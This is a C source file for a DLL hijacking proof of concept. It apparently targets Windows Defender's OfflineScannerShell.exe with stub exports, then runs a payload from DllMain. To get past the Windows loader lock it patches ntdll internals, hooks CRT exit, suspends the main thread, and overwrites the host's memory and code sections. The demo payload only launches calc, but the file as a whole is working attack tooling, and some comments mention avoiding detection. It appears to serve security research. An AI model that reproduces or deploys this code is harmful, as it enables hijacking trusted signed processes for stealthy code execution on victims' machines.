#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h> // For NTSTATUS
#include <process.h> // For CRT atexit functions
#include <shellapi.h> // For ShellExecute

#define DLL

// Standard EXE/DLL API boilerplate
#ifdef DLL
#define API __declspec(dllexport)
#define EMPTY_IMPL {}
#else
#define API __declspec(dllimport)
#define EMPTY_IMPL
#endif

// OfflineScannerShell.exe never calls any of these exports in the default code path
// However, we still need to export them so the Windows library loader will statically load our DLL
//
// We could also pass through the exported function calls to the real DLL: #pragma comment(linker, "/export:<EXPORT_FUNCTION_NAME>=<REAL_DLL_PATH>.<EXPORT_FUNCTION_NAME>
// This would allow the exports to function correctly (but again isn't necessary in our case)
//
// From Start menu, open: "Developer Command Prompt for VS [VERSION]"
// Get imports command: dumpbin.exe /imports "C:\Program Files\Windows Defender\Offline\OfflineScannerShell.exe"

EXTERN_C API VOID MpUpdateStartEx(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpClientUtilExportFunctions(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpFreeMemory(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerEnable(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpNotificationRegister(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpHandleClose(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpManagerVersionQuery(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpCleanStart(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpThreatOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpScanStart(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpScanResult(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpCleanOpen(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpThreatEnumerate(VOID) EMPTY_IMPL;
EXTERN_C API VOID MpRemapCallistoDetections(VOID) EMPTY_IMPL;

// DEBUG NOTICE
// Invoking ShellExecute with "calc" causes it to take a very different code path than if invoked with "calc.exe"
// Not including a file extension is how we get the "SHCORE!_WrapperThreadProc" thread as seen in the "Perfect DLL Hijacking" article
// Otherwise, ShellExecute goes directly to spawning the combase!CRpcThreadCache::RpcWorkerThreadEntry thread (among others)
// See this occur as ShellExecute spawns threads in WinDbg: bp ntdll!LdrInitializeThunk
// Investigating SHELL32.dll, this happens because SHELL32!CShellExecute::ExecuteNormal calls SHELL32!CShellExecute::_RunThreadMaybeWait (calc) instead of SHELL32!CShellExecute::_DoExecute (calc.exe) depending on the return value of CShellExecute::_ShouldCreateBackgroundThread
// This fact matters for our debugging because, in the second case (calc.exe), we don't get past the initial combase!CComApartment::StartServer -- (other functions) --> NdrCallClient2 deadlocked call stack unless we, as well as unlocking loader lock, also set the LdrpLoadCompleteEvent loader event, and set ntdll!LdrpWorkInProgess to zero
// Why? This requires investigating the target process of this NdrClientCall2 RPC call. Guess: csrss.exe (https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem)

VOID payload(VOID) {
    // Verify we've reached our payload:
    //__debugbreak();
    // Verify loader lock is gone in WinDbg: !critsec ntdll!LdrpLoaderLock
    ShellExecute(NULL, L"open", L"calc", NULL, NULL, SW_SHOW);
}

// These functions are exported from ntdll.dll but do not exist in the header files so we need to prototype and import them
// The functions could also be located at runtime with GetProcAddress
// Function signatures are sourced from ReactOS: https://doxygen.reactos.org
EXTERN_C NTSTATUS NTAPI LdrUnlockLoaderLock(_In_ ULONG Flags, _In_opt_ ULONG_PTR Cookie);
EXTERN_C NTSTATUS NTAPI LdrLockLoaderLock(_In_ ULONG Flags, _Out_opt_ PULONG Disposition, _Out_opt_ PULONG_PTR Cookie);
EXTERN_C NTSYSAPI void DECLSPEC_NORETURN WINAPI RtlExitUserProcess(NTSTATUS Status);
EXTERN_C NTSTATUS NTAPI LdrAddRefDll(IN ULONG Flags, IN PVOID BaseAddress);

PCRITICAL_SECTION getLdrpLoaderLockAddress(VOID) {
    PBYTE ldrUnlockLoaderLockSearchCounter = (PBYTE)&LdrUnlockLoaderLock;

    // call 0x41424344 (absolute for 32-bit program; relative for 64-bit program)
    const BYTE callAddressOpcode = 0xe8;
    const BYTE callAddressInstructionSize = sizeof(callAddressOpcode) + sizeof(INT32);
    // jmp 0x41
    const BYTE jmpAddressRelativeOpcode = 0xeb;

    // Search for this pattern (occurs twice in LdrUnlockLoaderLock and exists in other NTDLL functions so it seems unlikely to change):
    // 00007ffc`94a0df03 e84c07fcff           call    ntdll!LdrpReleaseLoaderLock (7ffc949ce654)
    // 00007ffc`94a0df08 ebaf                 jmp     ntdll!LdrUnlockLoaderLock+0x19 (7ffc94a0deb9)
    while (TRUE) {
        if (*ldrUnlockLoaderLockSearchCounter == callAddressOpcode) {
            // If there is a jmp address instruction directly below this one
            // This is for extra validation, if we are unlucky with the specific NTDLL build or ASLR then an addresses could contain the call opcode byte
            if (*(ldrUnlockLoaderLockSearchCounter + callAddressInstructionSize) == jmpAddressRelativeOpcode)
                break;
        }

        ldrUnlockLoaderLockSearchCounter++;
    }

    // Get address following call opcode
    INT32 rel32EncodedAddress = *(PINT32)(ldrUnlockLoaderLockSearchCounter + sizeof(callAddressOpcode));

    // Reverse engineering Native API function: LdrpReleaseLoaderLock
    // First argument: For output only, it returns a pointer (pointing to USER_SHARED_DATA, a read-only section used by the kernel) to a byte
    //   - The value of this byte should be zero under normal circumstances, otherwise the code jumps to some error-handling (the program may recover and jump back to the LdrpReleaseLoaderLock code or terminate)
    // Second argument: Unused (Exists in API for compatibility with previous/different Windows version? Reserved for future use?)
    // Third argument: Jump to error-handling code if it's a negative value
    // Return value: Passed through return value from ntdll!RtlLeaveCriticalSection (this is the function that actually unlocks the loader which makes sense)
    //   - ntdll!RtlLeaveCriticalSection takes one argument (the critical section, ntdll!LdrpLoaderLock in our case): https://doxygen.reactos.org/d0/d06/critical_8c_source.html
    //
    // Prototype function
    typedef INT32(NTAPI* LdrpReleaseLoaderLockType)(OUT PBYTE, INT32, INT32);

    // Get full address to LdrpReleaseLoaderLock function
    LdrpReleaseLoaderLockType LdrpReleaseLoaderLock = (LdrpReleaseLoaderLockType)(ldrUnlockLoaderLockSearchCounter + callAddressInstructionSize + rel32EncodedAddress);

    // Release loader lock
    // This is old code for calling LdrpReleaseLoaderLock to unlock ntdll!LdrpLoaderLock
    // Instead, we now proceed to find the address of the ntdll!LdrpLoaderLock critical section so we can easily re-lock later
    //LdrpReleaseLoaderLock(NULL, 2, 0); // Pass in 2 as second argument because that's what Windows does for statically loaded DLLs at least

    PBYTE ldrpReleaseLoaderLockAddressSearchCounter = (PBYTE)LdrpReleaseLoaderLock;

    // lea cx/ecx/rcx (size left unspecified, e.g. prepending 0x48 to the opcode would make it specific to rcx)
    // This is so it works on both a 32-bit or 64-bit process
    // Swapped from 0x8d0d to be in little endian
    const USHORT leaCxRegisterOpcode = 0x0d8d;
    const BYTE leaCxRegisterOpcodeInstructionSize = sizeof(leaCxRegisterOpcode) + sizeof(INT32);

    // Search for this pattern:
    // 00007ff9`4e04e673 488d0d4e7f1200  lea     rcx,[ntdll!LdrpLoaderLock (00007ff9`4e1765c8)]
    while (TRUE) {
        if (*(PUSHORT)ldrpReleaseLoaderLockAddressSearchCounter == leaCxRegisterOpcode)
            break;

        ldrpReleaseLoaderLockAddressSearchCounter++;
    }

    // Get pointer to ntdll!LdrpLoaderLock critical section in the .DATA section of NTDLL
    rel32EncodedAddress = *(PINT32)(ldrpReleaseLoaderLockAddressSearchCounter + sizeof(leaCxRegisterOpcode));
    PCRITICAL_SECTION LdrpLoaderLock = (PCRITICAL_SECTION)(ldrpReleaseLoaderLockAddressSearchCounter + leaCxRegisterOpcodeInstructionSize + rel32EncodedAddress);

    return LdrpLoaderLock;
}

VOID modifyLdrEvents(BOOL doSet, const HANDLE events[], const SIZE_T eventsSize) {
    // Set event handles used by Windows loader (they are always these handle IDs)
    // This is so we don't hang on WaitForSingleObject in the new thread (launched by ShellExecute) when it's loading more libraries
    // Check the state of these event handles in WinDbg with this command: !handle 0 8 Event

    // Signal and unsignal in reverse order to avoid ordering inversion issues
    if (!doSet) {
        for (SIZE_T i = 0; i < eventsSize; ++i)
            ResetEvent(events[i]);
    }
    else {
        for (SIZE_T i = eventsSize; i-- > 0;)
            SetEvent(events[i]);
    }
}

VOID preloadLibrariesForCurrentThread(VOID) {
    // These are all the libraries ShellExecute loads before launching a new thread
    // They must be manually loaded before calling ShellExecute because LdrpWorkInProgress must be set to TRUE for loading libraries on this thread but FALSE for loading libraries on the new thread
    // Otherwise, we get stuck looping infinitely (high CPU usage) in LdrpDrainWorkQueue and hang
    // It may just so happen that some of these libraries are loaded into your process, however, we need to ensure all of them are loaded
    // HOW TO: Collect a list of all the modules loaded by your API call(s) load by reading the "ModLoad" messages given at runtime by WinDbg

    LoadLibrary(L"SHCORE");
    LoadLibrary(L"msvcrt");
    LoadLibrary(L"combase");
    LoadLibrary(L"RPCRT4");
    LoadLibrary(L"bcryptPrimitives");
    LoadLibrary(L"shlwapi");
    LoadLibrary(L"windows.storage.dll"); // Need DLL extension for this one because it contains a dot in the name
    LoadLibrary(L"Wldp");
    LoadLibrary(L"advapi32");
    LoadLibrary(L"sechost");
}

PULONG64 getLdrpWorkInProgressAddress() {
    // Find and return address of ntdll!LdrpWorkInProgres

    PBYTE rtlExitUserProcessAddressSearchCounter = (PBYTE)&RtlExitUserProcess;

    // call 0x41424344 (absolute for 32-bit program; relative for 64-bit program)
    const BYTE callAddressOpcode = 0xe8;
    const BYTE callAddressInstructionSize = sizeof(callAddressOpcode) + sizeof(INT32);

    // Search for this pattern:
    // 00007ffc`949ed9a3 e84c0f0000           call    ntdll!LdrpDrainWorkQueue(7ffc949ee8f4)
    // 00007ffc`949ed9a8 e8070dfeff           call    ntdll!LdrpAcquireLoaderLock(7ffc949ce6b4)
    while (TRUE) {
        if (*rtlExitUserProcessAddressSearchCounter == callAddressOpcode) {
            // If there is another call opcode directly below this one
            if (*(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize) == callAddressOpcode)
                break;
        }

        rtlExitUserProcessAddressSearchCounter++;
    }

    INT32 rel32EncodedAddress = *(PINT32)(rtlExitUserProcessAddressSearchCounter + sizeof(callAddressOpcode));
    PBYTE ldrpDrainWorkQueue = (PBYTE)(rtlExitUserProcessAddressSearchCounter + callAddressInstructionSize + rel32EncodedAddress);
    PBYTE ldrpDrainWorkQueueAddressSearchCounter = ldrpDrainWorkQueue;

    // mov dword ptr [0x41424344], 0x1
    // Swapped from 0xc705 to be in little endian
    const USHORT movDwordAddressValueOpcode = 0x05c7;
    const BYTE movDwordAddressValueInstructionSize = sizeof(movDwordAddressValueOpcode) + sizeof(INT32) + sizeof(INT32);

    // Search for this pattern:
    // 00007ffc`949ee97f c7055fca100001000000 mov     dword ptr [ntdll!LdrpWorkInProgress (7ffc94afb3e8)], 1
    while (TRUE) {
        if (*(PUSHORT)ldrpDrainWorkQueueAddressSearchCounter == movDwordAddressValueOpcode) {
            // If TRUE (1) is being moved into this address
            if (*(PBOOL)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize - sizeof(INT32)) == TRUE)
                break;
        }

        ldrpDrainWorkQueueAddressSearchCounter++;
    }

    // Get pointer to ntdll!LdrpWorkInProgress boolean in the .DATA section of NTDLL
    rel32EncodedAddress = *(PINT32)(ldrpDrainWorkQueueAddressSearchCounter + sizeof(movDwordAddressValueOpcode));
    PULONG64 LdrpWorkInProgress = (PULONG64)(ldrpDrainWorkQueueAddressSearchCounter + movDwordAddressValueInstructionSize + rel32EncodedAddress);

    return LdrpWorkInProgress;
}

// List of all NTDLL loader events
// Confirmed in WinDbg with this command: sxe ld:ntdll; bp ntdll!NtCreateEvent
// This stops the debugger on the first instruction in NTDLL and breaks on event creation
// Look up the address returned in RCX after each NtCreateEvent to find its debug symbol name
// https://doxygen.reactos.org/d4/deb/ntoskrnl_2ex_2event_8c.html#a6fff8045fa5834e03707df042e7c7cde
//
// NOTE: These hex codes may change, they are simply created at process start in NTDLL with NtCreateEvent which decides on a handle ID value at run-time
// However, the algorithm being used for generating these handle ID values seems to deterministically generate these values
// To verify these handle IDs, simply look up the debug symbol names in WinDbg
// If this breaks, then we can always search assembly code to find the handle IDs (feel free to contribute this code)
#define LdrpInitCompleteEvent (HANDLE)0x4
#define LdrpLoadCompleteEvent (HANDLE)0x3c
#define LdrpWorkCompleteEvent (HANDLE)0x40

#undef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN

VOID LdrFullUnlock(VOID) {
    // Fully unlock the Windows library loader

    //
    // Initialization
    //

    const PCRITICAL_SECTION LdrpLoaderLock = getLdrpLoaderLockAddress();
    const HANDLE events[] = { LdrpInitCompleteEvent, LdrpWorkCompleteEvent };
    const SIZE_T eventsCount = sizeof(events) / sizeof(events[0]);
    const PULONG64 LdrpWorkInProgress = getLdrpWorkInProgressAddress();

    //
    // Preparation
    //

    LeaveCriticalSection(LdrpLoaderLock);
    // Preparation steps past this point are necessary if you will be creating new threads
    // And other scenarios, generally I notice it's necessary whenever a payload indirectly calls: __delayLoadHelper2
#ifdef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN
    preloadLibrariesForCurrentThread();
#endif
    modifyLdrEvents(TRUE, events, eventsCount);
    // This is so we don't hang in ntdll!ldrpDrainWorkQueue of the new thread (launched by ShellExecute) when it's loading more libraries
    // ntdll!LdrpWorkInProgress must be NON-ZERO while libraries are being loaded in the current thread (requires further research)
    // ntdll!LdrpWorkInProgress must be ZERO while libraries are loading in the newly spawned thread (requires further research)
    // For this reason, we must preload the libraries loaded by ShellExecute
    // Perform this operation atomically with InterlockedDecrement to maintain thread safety (I'm not sure this is necessary given that the NTDLL code isn't doing it but we will be even safer than Microsoft here)
    InterlockedDecrement64(LdrpWorkInProgress);

    //
    // Run our payload!
    //

#ifdef RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN
    // Libraries for this thread must be preloaded
    payload();
#else
    DWORD payloadThreadId;
    HANDLE payloadThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, &payloadThreadId);
    if (payloadThread)
        WaitForSingleObject(payloadThread, INFINITE);
#endif

    //
    // Cleanup
    //

    // Must set ntdll!LdrpWorkInProgress back to NON-ZERO otherwise we crash/deadlock in NTDLL library loader code sometime after returning from DllMain
    // The crash/deadlock occurs to due to concurrent operations happening in other threads
    // The problem arises due to ntdll!TppWorkerThread threads by default (https://devblogs.microsoft.com/oldnewthing/20191115-00/?p=103102)
    InterlockedAdd64(LdrpWorkInProgress, 1);
    // Reset these events to how they were to be safe (although it doesn't appear to be necessary at least in our case)
    modifyLdrEvents(FALSE, events, eventsCount);
    // Reacquire loader lock to be safe (although it doesn't appear to be necessary at least in our case)
    // Don't use the ntdll!LdrLockLoaderLock function to do this because it has the side effect of increasing ntdll!LdrpLoaderLockAcquisitionCount which we probably don't want
    EnterCriticalSection(LdrpLoaderLock);
}

// If the program whose DLL is being hijacked uses the original C:\Windows\System32\msvcrt.dll not as a compatibility layer (probably true for any program that ships from Microsoft with Windows)
// Undefine this if the CRT being used by the program is ucrtbase.dll or vcruntime<VERSION_NUMBER>.dll
#undef MSVCRT_ORIGINAL

#ifdef MSVCRT_ORIGINAL
HMODULE msvcrtHandle;
#endif

#ifdef MSVCRT_ORIGINAL
VOID MsvcrtAtexitHandler(VOID) {
    FARPROC msvcrtUnlockAddress = GetProcAddress(msvcrtHandle, "_unlock");
    typedef void(__cdecl* msvcrtUnlockType)(int);
    msvcrtUnlockType msvcrtUnlock = (msvcrtUnlockType)(msvcrtUnlockAddress);
    // The original MSVCRT has locking (a critical section) around the CRT exit
    // ShellExecute (a very complex function) calls atexit on a NEW THREAD causing us to hang unless we call msvcrt!unlockexit before calling ShellExecute
    // msvcrt!unlockexit isn't exported by msvcrt.dll (can't GetProcAddress it) but msvcrt!unlock is so we can effectively do the same thing by passing in 8 as its argument
    //
    // Disassembly of msvcrt!unlockexit from WinDbg:
    // msvcrt!unlockexit:
    // 00007ffc`9334a5d4 b908000000     mov     ecx, 8
    // 00007ffc`9334a5d9 e9a20c0000     jmp     msvcrt!_unlock(7ffc9334b280)
    // 00007ffc`9334a5de cc             int     3
    //
    // Critical section information from WinDbg:
    // !locks -v
    // CritSec msvcrt!CrtLock_Exit+0 at 00007ffc9339f500
    // WaiterWoken        No
    // LockCount          1
    // RecursionCount     1
    // OwningThread       1cde0
    // EntryCount         0
    // ContentionCount    1
    // ***Locked
    //
    // In my analysis, I've confirmed that unlocking this won't cause this atexit handler to run again if the CRT exit is called again (e.g. from our payload)
    // Luckily, MSVCRT is smart enough to run any remaining atexit handlers (that haven't already been run) then exit without any problems
    // Also, if more atexit handlers are created while we're in this atexit handler then they will also correctly run once before exit (all in the expected order too)
    // I just wanted to reinforce that this is 100% safe!
    //
    // UCRT does this differently with separate locks around adding to the atexit table and around using CRT exit
    // In UCRT, both of these locks are stored in this table: ucrtbase!environ_table+<SOME_OFFSET>
    // This table directly contains several critical section objects
    msvcrtUnlock(8);

    payload();

    // ShellExecute spawns a new thread and the main thread that spawns it doesn't wait for the whole time so add this sleep to make sure the program doesn't terminate before ShellExecute runs its process
    // The proper way to fix this would be to use ShellExecuteEx to get a process handle then wait for the process to start with WaitForInputIdle
    // This only seems to happen with MSVCRT, other CRTs seem to automatically wait for ShellExecute to finish before doing CRT exit and terminating the program
    // For creating new threads yourself, use WaitForSingleObject like normal to make sure you wait until the thread exits before allowing the program to exit
    Sleep(3000);

    // It's necessary to re-lock msvcrt!CrtLock_Exit because there could, however unlikely, be ANOTHER THREAD doing CRT exit at the exact same time as we're leaving this atexit handler
    // This could, for example, lead to a race condition that causes some atexit handlers proceeding us to be executed twice
    // MSVCRT's logic for walking thorugh the list of atexit handlers isn't atomic and msvcrt!CrtLock_Exit of course won't be re-locked for us by MSVCRT so we need to do it ourselves
    // By locking, we're permitting a potential other thread to continue doing CRT exit (running any remaining atexit handlers) and ultimately terminate the process on our behalf
    FARPROC msvcrtLockAddress = GetProcAddress(msvcrtHandle, "_lock");
    typedef void(__cdecl* msvcrtLockType)(int);
    msvcrtLockType msvcrtLock = (msvcrtLockType)(msvcrtLockAddress);
    msvcrtLock(8);
}
#endif

// https://doxygen.reactos.org/d1/d97/ldrtypes_8h.html#a24f55ce6836e445d46f2838d8719ba1c
#define LDR_ADDREF_DLL_PIN 0x00000001

VOID LdrLockEscapeAtCrtExit(PVOID isStaticLoad, HINSTANCE dllHandle) {
    // Must use CRT atexit functions, the normal atexit function runs under loader lock when run from a DLL
    // The rare case this technique won't work is when an executable is compiled to not be linked with a CRT whatsoever (with the /NODEFAULTLIB option) or with a /ENTRY that causes CRT initialization to not take place
    //   - It's especially rare because CRT initalization sets up a lot of basic things like security cookies before stack return addresses
#ifndef MSVCRT_ORIGINAL
    // Catch both normal exit and quick exit cases (just in case)
    // On newer versions of Visual Studio (e.g. 2022), these atexit shoud use the UCRT base. Full Visual C++ CRT will be used on older versions of Visual Studio
    _crt_atexit(payload);
    _crt_at_quick_exit(payload);
#else
    // If the program whose DLL your hijacking is a Microsoft-made Windows program then it probably links to the original C:\Windows\System32\msvcrt.dll
    // In that case, you will need to run the atexit function provided by MSVCRT (otherwise there will be no effect)
    // A specific version of WDK is required to link to the msvcrt.lib statically (optional, but it would allow you to get rid of the GetModuleHandle/GetProcAddress)
    msvcrtHandle = GetModuleHandle(L"msvcrt");
    if (msvcrtHandle == NULL)
        return;
    FARPROC msvcrtAtexitAddress = GetProcAddress(msvcrtHandle, "atexit");

    // Prototype function
    typedef int(__cdecl* msvcrtAtexitType)(void(__cdecl*)(void));

    msvcrtAtexitType msvcrtAtexit = (msvcrtAtexitType)(msvcrtAtexitAddress);
    msvcrtAtexit(MsvcrtAtexitHandler);
#endif

    // If this is a dynamic load then FreeLibrary could unload our DLL
    if (!isStaticLoad)
        // Pin our DLL so it can never be unloaded
        LdrAddRefDll(LDR_ADDREF_DLL_PIN, dllHandle);

    // Wait for process exit to escape loader lock...
}

VOID LdrLockWinRaceThread(HANDLE mainThread) {
    // Suspend the main thread
    // According to Microsoft documentation, suspending a thread that owns a synchronization object may cause a deadlock (but things can be done to avoid it still)
    SuspendThread(mainThread);

    // Avoid common heap allocation deadlock
    // If we suspend the main thread while it's allocating to the heap then this can happen
    // SuspendThread, ResumeThread, and thread exit don't make any heap allocations which avoids any issues there
    // If we HeapUnlock and make a heap allocation on this thread, there's a non-zero chance of a crash occurring when the main thread resumes due to breaking thread safety guarantees
    //HeapUnlock(GetProcessHeap());

    payload();

    ResumeThread(mainThread);

    CloseHandle(mainThread);

    // Thread exits...
}

VOID LdrLockWinRace(PVOID isStaticLoad) {
    // Try to suspend the main thread from a new thread before main thread exits causing process termination
    //
    // This won't work if the program exits *immediately* after being started
    //   - This is was true for my test bench executable which literally just statically loads this DLL and exits immediately
    //   - Either that or the new thread started while DLL exit routines were running under loader lock (leading to a deadlock)
    // If you're program stays open for long enough then it may work if you don't get unlucky on where the thread gets suspended at
    //   - For example, if the main thread gets suspended while it's holding a lock (e.g. commonly the heap lock for OfflineScannerShell.exe)
    //
    // This technique isn't that good, so I wouldn't use it.

    // Microsoft documentation: "If fdwReason is DLL_PROCESS_ATTACH, lpvReserved is NULL for dynamic loads and non-NULL for static loads."
    if (isStaticLoad) {
        // Static load
        HANDLE currentThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, GetCurrentThreadId());
        DWORD threadId;

        // This thread won't launch until loader lock is gone
        // Pass handle to current thread as an argument to the new thread
        HANDLE newThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LdrLockWinRaceThread, currentThread, 0, &threadId);
        if (newThread == NULL)
            return;

        // These may not be necessary if your target program stays open for long enough before exiting
        SetThreadPriority(newThread, THREAD_PRIORITY_TIME_CRITICAL);
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE);
    }
    else {
        // Dynamic load
        // A program loading dynamically probably won't exit right away
        DWORD threadId;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LdrLockWinRaceThread, NULL, 0, &threadId);
    }
}

LPVOID dataMemorySectionExeBackup, dataMemorySectionExeAddress;
SIZE_T dataMemorySectionExeSize;
PVOID exceptionHandler;

LONG WINAPI LdrLockEscapeVehCatchExceptionHandler(PEXCEPTION_POINTERS exceptionInfo) {
    // Remember that this exception must have occurred in the main thread to prevent the program from exiting

    // Restore memory section backup and clean up
    RtlCopyMemory(dataMemorySectionExeAddress, dataMemorySectionExeBackup, dataMemorySectionExeSize);
    RemoveVectoredExceptionHandler(exceptionHandler);

    payload();

    // Resume normal execution (may not actually be possible)...
    return EXCEPTION_CONTINUE_EXECUTION;
}

VOID LdrLockEscapeVehCatchException(VOID) {
    // This technique only works if you can get your main thread to raise an exception/interrupt (e.g. int3 or access violation)
    // Any other thread probably won't work (depending on your target) because the main thread will continue executing until it exits thus exiting the entire program

    HMODULE exeHandle = GetModuleHandle(NULL);

    // Search for .data memory section
    // We choose this memory section because it's the only one that we don't have to change permissions on for read and write access (calling VirtualProtect is prone to detection)
    MEMORY_BASIC_INFORMATION mbi;
    while (VirtualQuery(exeHandle, &mbi, sizeof(mbi))) {
        if (mbi.Protect == PAGE_READWRITE) {
            // Back up memory section
            dataMemorySectionExeBackup = HeapAlloc(GetProcessHeap(), 0, mbi.RegionSize);
            if (dataMemorySectionExeBackup == NULL)
                return;
            RtlCopyMemory(dataMemorySectionExeBackup, exeHandle, mbi.RegionSize);

            // This is an attempt at getting our program to go down a wrong code path that will lead to an exception
            // Fill memory section with some value that will cause an interrupt in the main thread (this may or may not work at all)
            RtlFillMemory(exeHandle, mbi.RegionSize, 0xff);

            // Add process-wide exception handler
            // Exception handling code is run on the same thread that generates the exception
            exceptionHandler = AddVectoredExceptionHandler(TRUE, (PVECTORED_EXCEPTION_HANDLER)LdrLockEscapeVehCatchExceptionHandler);

            // Save memory section address and size
            dataMemorySectionExeAddress = exeHandle;
            dataMemorySectionExeSize = mbi.RegionSize;
            break;
        }

        exeHandle = (HMODULE)((DWORD_PTR)exeHandle + mbi.RegionSize);
    }
}

VOID LdrLockDetonateNuclearOptionPayload(VOID) {
    payload();

    // The program doesn't crash if we don't exit but it does hang forever
    ExitProcess(0);

    // Returning from this function causes: ntdll!RtlExitUserThread -> ntdll!NtTerminateThread
}

VOID LdrLockDetonateNuclearOption(VOID) {
    // This technique is a basic PoC just to get something working as a starting point
    // It overwrites the entire .text page of the EXE with NOP instructions then places a JMP gadget pointing to our payload at the very end
    // It doesn't feature process continuation and certainly isn't very subtle

    HMODULE exeHandle = GetModuleHandle(NULL);

    // This assumes the PE header section is size 0x1000 and that the code section is right after it which will be true for 99.9% of executables but there's technically no guarantee
    PBYTE codeSection = (PBYTE)exeHandle + 0x1000;

    // Get size of code section
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(codeSection, &mbi, sizeof(mbi));

    DWORD oldProtect = 0;
    VirtualProtect(codeSection, mbi.RegionSize, PAGE_READWRITE, &oldProtect);

    // Fill code section with NOP instructions
    RtlFillMemory(codeSection, mbi.RegionSize, 0x90);

    // Assemble these instructions with NASM
    BYTE jmpAssembly[12] = {
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <placeholder address>
        0xff, 0xe0 // jmp rax
    };

    // Place JMP gadget at end of code section
    RtlCopyMemory(codeSection + mbi.RegionSize - sizeof(jmpAssembly), jmpAssembly, sizeof(jmpAssembly));
    DWORD_PTR* assemblyJmpDestinationAddr = (DWORD_PTR*)(codeSection + mbi.RegionSize - sizeof(jmpAssembly) + 2);
    *assemblyJmpDestinationAddr = (DWORD_PTR)LdrLockDetonateNuclearOptionPayload; // Set JMP destination address

    VirtualProtect(codeSection, mbi.RegionSize, oldProtect, &oldProtect);
}

#undef I_PLEDGE_TO_NOT_USE_THIS_RUBE_GOLDBERG_MACHINE_IN_PRODUCTION_CODE
// Please sign: [YOUR NAME HERE]
// Thank you for your cooperation!

// https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain#example
BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        //
        // Choose a technique:
        //

#ifdef I_PLEDGE_TO_NOT_USE_THIS_RUBE_GOLDBERG_MACHINE_IN_PRODUCTION_CODE
        LdrFullUnlock();
#endif
        LdrLockEscapeAtCrtExit(lpvReserved, hinstDll);
        //LdrLockWinRace(lpvReserved);
        //LdrLockEscapeVehCatchException();
        //LdrLockDetonateNuclearOption();
    }

    return TRUE;
}
